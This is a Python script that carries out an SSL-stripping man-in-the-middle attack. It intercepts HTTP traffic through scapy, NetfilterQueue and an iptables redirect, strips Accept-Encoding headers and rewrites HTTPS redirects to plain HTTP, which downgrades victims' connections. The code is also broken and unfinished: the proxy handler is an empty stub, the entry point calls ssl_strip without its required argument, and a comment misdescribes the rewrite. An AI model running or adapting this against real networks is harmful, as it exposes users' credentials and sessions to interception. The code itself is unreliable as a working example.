from scapy.all import *
import re 
import os  
import socket
from netfilterqueue import NetfilterQueue
from threading import Thread

# process intercepted packets
def process_traffic(packet):
    # Convert packet to a Scapy packet
    p = IP(packet.get_payload())

    print("Packet intercepted: ")
    print(p.show())

    # Check if the packet has a Raw layer, where the HTTP messege is located
    # so check if payload of the packet contains HTTP data
    if p.haslayer(Raw):

        # decode packet payload
        load = p[Raw].load.decode(errors="ignore")

        # check if the packet is a TCP packet
        if p.haslayer(TCP):
            # destination port 80 is the default port for HTTP traffic
            if p[TCP].dport == 80:
                # remove the Accept-Encoding header from the HTTP request
                load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
                print(load)
            # source port 80 is the default port for HTTP traffic
            elif p[TCP].sport == 80:
                # remove the Content-Encoding header from the HTTP response
                load = re.sub("Location: https://", "Location: http://", load)
                print(load)

        # If the load was modified, update the packet
        if load != p[Raw].load:
            # Update the packet with the new payload
            p[Raw].load = load
            # delete the checksums and length of the packet
            del p[IP].len
            del p[IP].chksum
            del p[TCP].chksum
            # convert scapy packet to a regular packet
            packet.set_payload(bytes(p))

    # accept the packet and forward it to its destination
    packet.accept()



def start_proxy():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to port 10000
    s.bind(('0.0.0.0', 10000))

    # Listen for incoming connections
    s.listen(1)

    while True:
        # Accept a connection
        conn, addr = s.accept()

        # Handle the connection
        handle_connection(conn)

def handle_connection(conn):
    # Receive data from the client
    data = conn.recv(1024)

    # Modify the data as necessary for the SSLStrip attack

    # Send the modified data to the server

    # Close the connection
    conn.close()



# start SSL stripping attack
def ssl_strip(interface):
    # Start the proxy in a separate thread
    proxy_thread = Thread(target=start_proxy)
    proxy_thread.start()

    # Enable IP forwarding, redirect HTTP traffic to port 10000
    os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
    queue = NetfilterQueue()
    queue.bind(0, process_traffic)
    queue.run()

if __name__ == "__main__":
    ssl_strip()
